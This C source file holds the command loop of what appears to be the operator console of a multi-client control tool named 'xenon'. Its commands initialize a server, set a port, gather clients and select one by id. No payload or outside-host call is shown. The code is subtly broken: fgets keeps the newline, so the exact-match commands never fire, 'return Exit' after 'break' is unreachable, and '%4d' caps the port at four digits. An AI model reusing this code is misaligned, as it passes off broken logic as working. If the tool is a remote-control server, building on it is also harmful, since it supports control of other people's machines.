#include "xenon.h"
#include "../XenonH/xenonhelper.h"

extern CLIENT clients[NCLIENTSMAX];

#define Exit 2


int __pexec()
{

	int PORT = 0;
	char buff[1024];
	char idarg[5];

	while (1)
	{

		printf(WHITE"\n>> " WHITE);
		fgets(buff, sizeof(buff), stdin);

		if (strcmp(buff, "-init") == 0)
		{
			WININIT();
		}


		else if (strcmp(buff, "-gc") == 0)
		{
			if (PORT == 0)
			{
				fprintf(stderr, "\n[-] Please set a port number before initializing the server.\n");
				continue;
			}
			GetClient();
		}
		else if (strcmp(buff, "exit") == 0)
		{
			break;
			return Exit;
		}
		else if (sscanf(buff, "-select %4s", idarg) == 1)
		{
			Select(idarg);
		}
		else if (sscanf(buff, "-p %4d", &PORT) == 1)
		{

			if (PORT < 1 || PORT > 65535)
			{
				fprintf(stderr, "\n[-] Invalid port number.\n");
				continue;
			}

			continue;

		}
		else if (strcmp(buff, "clear") == 0) { system("cls"); }

		else {continue;}
		

	}

	return 0;

}